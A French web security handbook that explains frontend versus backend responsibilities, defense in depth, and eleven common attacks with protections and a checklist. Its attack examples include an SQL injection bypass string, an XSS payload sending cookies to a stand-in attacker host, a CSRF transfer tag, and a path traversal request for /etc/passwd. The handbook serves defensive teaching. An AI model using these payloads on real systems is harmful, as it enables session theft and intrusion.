**🔐 Manuel de Sécurité Web**

**Opérations Frontend & Backend**

*Types d\'attaques · Protections · Bonnes pratiques*

  -----------------------------------------------------------------------
  **⚠️ Ne jamais faire confiance au client --- Never Trust The Client**

  -----------------------------------------------------------------------

Version 1.0 --- 2025

**Table des Matières**

**1. Opérations Frontend**

Le frontend est tout ce qui s\'exécute dans le navigateur de
l\'utilisateur. Il est par nature exposé, inspectable et modifiable. Son
rôle est d\'offrir une expérience utilisateur fluide et réactive, jamais
de garantir la sécurité.

  -----------------------------------------------------------------------
  **Règle fondamentale : Le frontend sert l\'UX, jamais la sécurité.**

  -----------------------------------------------------------------------

**1.1 Rôle et responsabilités du Frontend**

  ---------------------- ------------------------------ -----------------
  **Responsabilité**     **Description**                **Niveau de
                                                        confiance**

  Affichage des données  Rendu HTML/CSS des données     Neutre
                         reçues du backend              

  Validation UX          Vérifications légères (champs  Faible --- jamais
                         vides, format email\...)       suffisant seul

  Gestion des sessions   Stockage du token              Faible --- dépend
                         (sessionStorage, cookie        du backend
                         httpOnly)                      

  Navigation / routing   SPA routing côté client (React Neutre
                         Router, Vue Router\...)        

  Interaction            Formulaires, clics,            Neutre
  utilisateur            animations, feedback visuel    

  Requêtes API           Appels HTTP vers le backend    Neutre
                         (fetch, axios)                 
  ---------------------- ------------------------------ -----------------

**1.2 Validations à faire côté Frontend (UX uniquement)**

Ces validations améliorent l\'expérience utilisateur mais ne remplacent
JAMAIS la validation backend :

-   **Champs obligatoires :** vérifier que les champs requis ne sont pas
    vides avant envoi

-   **Format basique :** email (regex), téléphone, code postal

-   **Longueur minimale/maximale :** mot de passe, texte libre

-   **Correspondance :** confirmation de mot de passe

-   **Types numériques :** âge \> 0, prix \> 0

-   **Retour immédiat :** messages d\'erreur inline sans rechargement de
    page

  -----------------------------------------------------------------------
  **⚠️ Ces validations peuvent toutes être contournées en quelques
  secondes via les DevTools ou une requête HTTP directe.**

  -----------------------------------------------------------------------

**1.3 Ce que le Frontend NE doit JAMAIS faire**

-   Stocker des données sensibles en clair (mots de passe, données
    bancaires, clés API)

-   Calculer ou décider des droits d\'accès (ex: if (user.role ===
    \'admin\'))

-   Faire confiance aux paramètres d\'URL pour autoriser l\'accès à une
    ressource

-   Cacher des éléments d\'interface comme seule protection (ex:
    style=\'display:none\')

-   Embarquer des secrets (clés API privées, credentials de base de
    données)

-   Utiliser localStorage pour des tokens JWT ou sessions sensibles

**2. Opérations Backend**

Le backend est la couche de confiance de votre application. Toutes les
décisions de sécurité, les validations définitives et les accès aux
données doivent y être réalisés.

  -----------------------------------------------------------------------
  **Règle fondamentale : Le backend est l\'unique autorité de
  confiance.**

  -----------------------------------------------------------------------

**2.1 Responsabilités obligatoires du Backend**

  ------------------ -------------------------- -------------------------
  **Opération**      **Pourquoi c\'est          **Exemple**
                     critique**                 

  Authentification   Vérifier l\'identité       JWT, OAuth2, sessions
                     réelle de l\'utilisateur   

  Autorisation       Vérifier les droits avant  RBAC, ABAC
  (contrôle          chaque action              
  d\'accès)                                     

  Validation de      Les données client ne sont Longueur, type, format,
  toutes les entrées jamais fiables             plage

  Assainissement     Nettoyer les données avant Escaping HTML, paramètres
  (sanitization)     usage                      SQL

  Hashage des mots   Ne jamais stocker en clair bcrypt, argon2, scrypt
  de passe                                      

  Gestion des        Émettre, valider et        JWT avec expiration
  tokens/sessions    révoquer                   courte

  Rate limiting      Limiter les abus et        Max 5 tentatives/minute
                     attaques par force brute   

  Journalisation     Tracer les actions pour    Connexions,
  (logging)          audit et détection         modifications, erreurs

  Chiffrement des    Protéger les données au    AES-256, TLS 1.3
  données sensibles  repos et en transit        

  Gestion des        Ne pas exposer les détails Messages génériques côté
  erreurs sécurisée  techniques                 client
  ------------------ -------------------------- -------------------------

**2.2 Validations à réaliser côté Backend**

**Validation des types et formats**

-   Vérifier que chaque champ reçu est du type attendu (string, int,
    boolean\...)

-   Valider les formats : email valide, UUID valide, date ISO, etc.

-   Rejeter les champs inconnus ou non attendus (whitelist des
    paramètres)

**Validation des valeurs et plages**

-   Bornes numériques : âge entre 0 et 150, prix \> 0, quantité ≥ 1

-   Longueurs : limiter la taille de chaque champ texte

-   Énumérations : vérifier que la valeur fait partie des choix
    autorisés

**Contrôle d\'accès aux ressources**

-   Toujours vérifier : l\'utilisateur A peut-il accéder à la ressource
    X ?

-   Ne jamais se fier à l\'ID fourni par le client sans vérifier la
    propriété

-   Appliquer le principe du moindre privilège

**2.3 Principe de défense en profondeur**

La sécurité ne repose jamais sur une seule couche. Plusieurs barrières
indépendantes doivent être empilées :

  ------------------ -------------------------------------------------------
  **Couche**         **Mécanisme**

  1\. Réseau         Pare-feu, WAF (Web Application Firewall), TLS
                     obligatoire

  2\.                MFA, tokens à durée limitée, rotation des secrets
  Authentification   

  3\. Autorisation   Vérification systématique des droits côté serveur

  4\. Validation des Schémas de validation stricts (Joi, Zod, Bean
  données            Validation\...)

  5\. Base de        Requêtes préparées, utilisateur DB avec droits minimaux
  données            

  6\. Application    Mises à jour des dépendances, SAST, revues de code

  7\. Monitoring     Alertes, logs centralisés, détection d\'anomalies
  ------------------ -------------------------------------------------------

**3. Types d\'Attaques et Protections**

Cette section présente les attaques web les plus courantes, leur
fonctionnement, et comment s\'en protéger. Chaque attaque est classifiée
par cible (frontend/backend/les deux) et par niveau de risque.

  ------------------ ----------------------------------------------------
  **Niveau de        **Signification**
  risque**           

  🔴 Critique        Compromission totale possible (données, serveur,
                     utilisateurs)

  🟠 Élevé           Fuite de données ou prise de contrôle partielle

  🟡 Modéré          Impact limité mais réel sur la disponibilité ou
                     l\'intégrité
  ------------------ ----------------------------------------------------

**3.1 Injection SQL (SQLi)**

**⚡ Injection SQL**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Injection de code      Backend --- Base de    Critique
                         données                
  ---------------------- ---------------------- -------------------------

📖 Description : L\'attaquant insère du code SQL dans un champ de
formulaire ou un paramètre d\'URL. Si les entrées ne sont pas assainies,
la base de données exécute le code malveillant.

*💥 Exemple d\'attaque : Username: admin\' OR \'1\'=\'1\'; \-- →
contourne l\'authentification et logue l\'attaquant en tant qu\'admin.*

🛡️ Protection :

-   Utiliser des requêtes préparées (prepared statements) avec des
    paramètres liés

-   Ne jamais concaténer des entrées utilisateur dans une requête SQL

-   Utiliser un ORM (Hibernate, SQLAlchemy, Sequelize) qui paramètre
    automatiquement

-   Principe du moindre privilège : l\'utilisateur DB ne doit pas avoir
    DROP/ALTER

-   Valider et filtrer toutes les entrées côté backend

-   Activer un WAF (Web Application Firewall)

**3.2 Cross-Site Scripting (XSS)**

**⚡ XSS --- Cross-Site Scripting**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Injection de script    Frontend ---           Élevé
                         Navigateur des         
                         victimes               
  ---------------------- ---------------------- -------------------------

📖 Description : L\'attaquant injecte du JavaScript malveillant dans le
contenu d\'une page. Quand d\'autres utilisateurs chargent cette page,
le script s\'exécute dans leur navigateur à leur insu.

*💥 Exemple d\'attaque :
\<script\>fetch(\'https://attaquant.com/steal?c=\'+document.cookie)\</script\>
→ vole les cookies de session de tous les visiteurs.*

🛡️ Protection :

-   Échapper systématiquement toutes les sorties HTML (HTML encoding)

-   Utiliser une Content Security Policy (CSP) stricte

-   Marquer les cookies sensibles avec httpOnly et Secure

-   Utiliser les frameworks modernes (React, Vue) qui échappent par
    défaut

-   Ne jamais utiliser innerHTML, document.write() avec des données non
    fiables

-   Valider et assainir toutes les entrées utilisateur côté backend

**3.3 Cross-Site Request Forgery (CSRF)**

**⚡ CSRF --- Falsification de requête**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Exploitation de        Frontend --- Session   Élevé
  session                de l\'utilisateur      
  ---------------------- ---------------------- -------------------------

📖 Description : L\'attaquant piège un utilisateur authentifié pour
qu\'il envoie involontairement une requête à une application à laquelle
il est connecté. La requête est légitime aux yeux du serveur car elle
porte les cookies de session.

*💥 Exemple d\'attaque : L\'utilisateur visite un site malveillant
contenant \<img
src=\'https://monbank.com/virement?dest=attaquant&montant=5000\'\>. Le
navigateur envoie automatiquement la requête avec les cookies de la
banque.*

🛡️ Protection :

-   Utiliser des tokens CSRF anti-forgery (synchronizer token pattern)

-   Vérifier l\'en-tête Origin et Referer côté serveur

-   Utiliser SameSite=Strict ou SameSite=Lax sur les cookies

-   Exiger une ré-authentification pour les actions sensibles (virement,
    changement d\'email)

-   Ne pas utiliser GET pour les actions qui modifient l\'état

**3.4 Insecure Direct Object Reference (IDOR)**

**⚡ IDOR --- Référence directe non sécurisée**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Contrôle d\'accès      Backend --- API        Élevé
  défaillant                                    
  ---------------------- ---------------------- -------------------------

📖 Description : L\'application expose des identifiants internes (ID de
commande, ID d\'utilisateur) dans les URLs ou paramètres. Un attaquant
peut modifier cet ID pour accéder aux données d\'un autre utilisateur.

*💥 Exemple d\'attaque : /api/facture/1234 → l\'attaquant modifie en
/api/facture/1235 et accède à la facture d\'un autre client sans aucune
restriction.*

🛡️ Protection :

-   Toujours vérifier côté backend que l\'utilisateur est propriétaire
    de la ressource demandée

-   Utiliser des identifiants non séquentiels (UUID v4) pour rendre
    l\'énumération difficile

-   Implémenter un contrôle d\'accès basé sur les rôles (RBAC)
    systématique

-   Ne jamais se fier à l\'identité fournie par le client

-   Journaliser les accès aux ressources sensibles

**3.5 Attaque par Force Brute**

**⚡ Brute Force / Credential Stuffing**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Attaque                Backend ---            Élevé
  d\'authentification    Authentification       
  ---------------------- ---------------------- -------------------------

📖 Description : L\'attaquant essaie automatiquement des millions de
combinaisons email/mot de passe. Dans le credential stuffing, il
réutilise des identifiants volés lors d\'autres fuites de données.

*💥 Exemple d\'attaque : Un bot essaie 100 000 combinaisons de mots de
passe sur /api/login en quelques minutes jusqu\'à trouver un compte
valide.*

🛡️ Protection :

-   Implémenter un rate limiting strict (ex: max 5 tentatives / 15 min
    par IP)

-   Imposer un délai exponentiel (exponential backoff) après échec

-   Bloquer temporairement le compte après N échecs consécutifs

-   Activer l\'authentification multi-facteurs (MFA/2FA)

-   Utiliser un CAPTCHA après plusieurs échecs

-   Surveiller et alerter sur les pics de tentatives de connexion

**3.6 Man-in-the-Middle (MITM)**

**⚡ MITM --- Interception de communication**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Interception réseau    Réseau --- Entre       Critique
                         client et serveur      
  ---------------------- ---------------------- -------------------------

📖 Description : L\'attaquant se positionne entre l\'utilisateur et le
serveur pour intercepter, lire ou modifier les communications en
transit.

*💥 Exemple d\'attaque : Sur un réseau Wi-Fi public non sécurisé,
l\'attaquant intercepte les communications HTTP en clair et capture les
cookies de session ou données de formulaire.*

🛡️ Protection :

-   Utiliser HTTPS partout --- TLS 1.2 minimum, TLS 1.3 recommandé

-   Activer HSTS (HTTP Strict Transport Security) avec une longue durée

-   Implémenter Certificate Pinning pour les applications mobiles
    critiques

-   Configurer correctement les certificats TLS (pas d\'algorithmes
    faibles)

-   Utiliser HSTS Preloading pour les domaines critiques

-   Chiffrer les données sensibles au niveau applicatif en plus du
    transport

**3.7 Authentification Défaillante**

**⚡ Broken Authentication**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Gestion des sessions   Backend --- Sessions   Critique
                         et tokens              
  ---------------------- ---------------------- -------------------------

📖 Description : Mauvaise gestion des tokens de session : tokens qui
n\'expirent jamais, secrets JWT faibles, sessions non invalidées à la
déconnexion, rotation des tokens absente.

*💥 Exemple d\'attaque : Un token JWT est signé avec un secret faible
(\'secret123\'). L\'attaquant le casse en quelques secondes, forge un
token admin et accède à l\'interface d\'administration.*

🛡️ Protection :

-   Utiliser des secrets JWT longs et aléatoires (min 256 bits)

-   Définir des durées d\'expiration courtes pour les tokens (15-60 min)

-   Invalider les tokens côté serveur à la déconnexion (liste noire ou
    rotation)

-   Implémenter le refresh token avec rotation

-   Ne jamais stocker de tokens dans localStorage (XSS risque)

-   Utiliser des cookies httpOnly + Secure + SameSite

**3.8 Exposition de Données Sensibles**

**⚡ Sensitive Data Exposure**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Fuite d\'informations  Backend --- API et     Critique
                         base de données        
  ---------------------- ---------------------- -------------------------

📖 Description : L\'application renvoie plus de données que nécessaire,
expose des informations techniques dans les messages d\'erreur, ou
stocke des données sensibles sans chiffrement.

*💥 Exemple d\'attaque : Une API retourne l\'objet utilisateur complet
incluant le hash du mot de passe, le numéro de sécurité sociale et
l\'adresse IP lors d\'une simple requête GET /user/profile.*

🛡️ Protection :

-   Appliquer le principe du moindre exposition : ne renvoyer que les
    champs nécessaires

-   Utiliser des DTOs (Data Transfer Objects) pour filtrer les réponses
    API

-   Chiffrer les données sensibles en base de données (AES-256)

-   Hasher les mots de passe avec bcrypt, argon2 ou scrypt (jamais
    MD5/SHA1)

-   Masquer les messages d\'erreur techniques côté client

-   Audit régulier des réponses API (quelles données sont exposées ?)

**3.9 Mass Assignment**

**⚡ Mass Assignment**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Manipulation de        Backend --- Logique    Élevé
  données                métier                 
  ---------------------- ---------------------- -------------------------

📖 Description : L\'application lie automatiquement tous les champs
d\'une requête à un objet modèle sans filtrage. Un attaquant peut
envoyer des champs supplémentaires non attendus pour modifier des
propriétés sensibles.

*💥 Exemple d\'attaque : L\'API accepte PATCH /user avec
{name:\'Alice\'}. L\'attaquant envoie {name:\'Alice\', role:\'admin\',
balance:9999999} et élève ses privilèges.*

🛡️ Protection :

-   Utiliser une whitelist des champs autorisés (jamais de bind
    automatique de tous les champs)

-   Définir explicitement les champs acceptés dans chaque endpoint

-   Utiliser des DTOs/schémas stricts qui ignorent les champs inconnus

-   Tester avec des payloads contenant des champs sensibles
    supplémentaires

**3.10 Déni de Service (DoS / DDoS)**

**⚡ DoS / DDoS**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Attaque de             Infrastructure ---     Élevé
  disponibilité          Réseau et serveur      
  ---------------------- ---------------------- -------------------------

📖 Description : L\'attaquant surcharge le serveur de requêtes pour
l\'épuiser et le rendre indisponible. Un DDoS utilise un réseau de
machines compromises (botnet).

*💥 Exemple d\'attaque : 10 000 machines envoient simultanément des
requêtes lourdes vers /api/search avec des paramètres complexes,
épuisant les ressources CPU et base de données.*

🛡️ Protection :

-   Utiliser un CDN avec protection DDoS (Cloudflare, AWS Shield)

-   Implémenter du rate limiting par IP et par utilisateur

-   Paginer toutes les API et limiter la taille des réponses

-   Mettre en cache agressivement les réponses statiques

-   Configurer des timeouts et des limites de connexions

-   Monitorer les métriques et alerter sur les anomalies de trafic

**3.11 Path Traversal**

**⚡ Path Traversal / Directory Traversal**

  ---------------------- ---------------------- -------------------------
  **Catégorie**          **Cible**              **Niveau de risque**

  Accès au système de    Backend --- Serveur de Critique
  fichiers               fichiers               
  ---------------------- ---------------------- -------------------------

📖 Description : L\'attaquant manipule les paramètres de chemin de
fichier pour accéder à des fichiers en dehors du répertoire autorisé en
utilisant des séquences ../.

*💥 Exemple d\'attaque : GET /download?file=../../../etc/passwd →
l\'attaquant lit le fichier des utilisateurs système du serveur.*

🛡️ Protection :

-   Valider et normaliser tous les chemins de fichiers fournis par
    l\'utilisateur

-   Utiliser une whitelist de fichiers/répertoires autorisés

-   Résoudre le chemin absolu et vérifier qu\'il est dans le répertoire
    autorisé

-   Ne jamais laisser l\'utilisateur contrôler directement un chemin de
    fichier

-   Utiliser un utilisateur système avec des droits minimaux pour le
    serveur web

**4. Tableau Récapitulatif**

  --------------- --------------- ------------------ ------------ -----------------
  **Attaque**     **Vecteur**     **Cible**          **Risque**   **Protection
                                                                  principale**

  Injection SQL   Entrée          Base de données    🔴 Critique  Requêtes
                  utilisateur                                     préparées

  XSS             Contenu injecté Navigateur /       🟠 Élevé     Encodage HTML,
                                  session                         CSP

  CSRF            Requête forgée  Session            🟠 Élevé     Token CSRF,
                                  utilisateur                     SameSite

  IDOR            ID manipulé     API / ressources   🟠 Élevé     Contrôle d\'accès
                                                                  backend

  Brute Force     Requêtes        Authentification   🟠 Élevé     Rate limiting,
                  répétées                                        MFA

  MITM            Réseau non      Communications     🔴 Critique  HTTPS/TLS, HSTS
                  chiffré                                         

  Broken Auth     Token           Sessions / tokens  🔴 Critique  JWT sécurisé,
                  faible/expiré                                   expiration

  Data Exposure   API / erreurs   Données sensibles  🔴 Critique  DTOs, chiffrement

  Mass Assignment Corps de        Logique métier     🟠 Élevé     Whitelist des
                  requête                                         champs

  DoS / DDoS      Flood de        Infrastructure     🟠 Élevé     CDN, rate
                  requêtes                                        limiting

  Path Traversal  Paramètre de    Système de         🔴 Critique  Validation des
                  chemin          fichiers                        chemins
  --------------- --------------- ------------------ ------------ -----------------

**5. Checklist de Sécurité**

  -----------------------------------------------------------------------
  **✅ Frontend**

  -----------------------------------------------------------------------

-   Aucune clé API ou secret embarqué dans le code frontend

-   Cookies marqués httpOnly, Secure et SameSite=Strict

-   Content Security Policy (CSP) configurée

-   Pas de innerHTML ou document.write avec des données utilisateur

-   Pas de logique d\'autorisation côté client uniquement

-   Validation UX uniquement (doublée obligatoirement côté backend)

  -----------------------------------------------------------------------
  **✅ Backend**

  -----------------------------------------------------------------------

-   Toutes les entrées validées et assainies côté serveur

-   Requêtes préparées pour toutes les interactions base de données

-   Contrôle d\'accès vérifié pour chaque endpoint

-   Mots de passe hashés avec bcrypt ou argon2

-   Rate limiting sur les endpoints d\'authentification

-   Tokens JWT avec expiration courte et secret fort

-   Messages d\'erreur génériques côté client (pas de stack trace)

-   Logs des actions sensibles (connexion, modification, accès données)

  -----------------------------------------------------------------------
  **✅ Infrastructure**

  -----------------------------------------------------------------------

-   HTTPS forcé partout (HSTS activé)

-   Dépendances à jour (npm audit, pip check, Dependabot\...)

-   WAF (Web Application Firewall) configuré

-   Headers de sécurité HTTP : X-Frame-Options, X-Content-Type-Options,
    Referrer-Policy

-   Scan de sécurité régulier (OWASP ZAP, Burp Suite, tests de
    pénétration)

-   Sauvegardes chiffrées et plan de reprise après incident

**6. Références et Ressources**

**6.1 Standards et Guides**

-   **OWASP Top 10 :** owasp.org --- Les 10 risques de sécurité web les
    plus critiques

-   **OWASP ASVS :** Application Security Verification Standard ---
    référentiel complet

-   **CWE/SANS Top 25 :** cwe.mitre.org --- Les 25 erreurs logicielles
    les plus dangereuses

-   **NIST Cybersecurity Framework :** csrc.nist.gov --- Cadre de
    cybersécurité

**6.2 Outils de Test**

-   **OWASP ZAP :** Scanner de sécurité automatique open-source

-   **Burp Suite :** Plateforme de test de sécurité web (Community
    Edition gratuite)

-   **sqlmap :** Test automatisé d\'injection SQL

-   **npm audit / pip check :** Détection de vulnérabilités dans les
    dépendances

**6.3 Bibliothèques de Sécurité Recommandées**

  ----------------- -------------------- ------------------------------------
  **Technologie**   **Bibliothèque**     **Usage**

  Node.js           helmet               Headers HTTP de sécurité

  Node.js           express-rate-limit   Rate limiting

  Node.js           bcrypt / argon2      Hashage de mots de passe

  Python            passlib              Hashage de mots de passe

  Python / JS       Joi / Zod / Pydantic Validation des données

  Java              Spring Security      Authentification et autorisation

  Tous              HTTPS / Let\'s       Chiffrement des communications
                    Encrypt              
  ----------------- -------------------- ------------------------------------

  -----------------------------------------------------------------------
  **🔐 La sécurité n\'est pas une fonctionnalité que l\'on ajoute à la
  fin --- c\'est un processus continu intégré dès la conception.**

  -----------------------------------------------------------------------
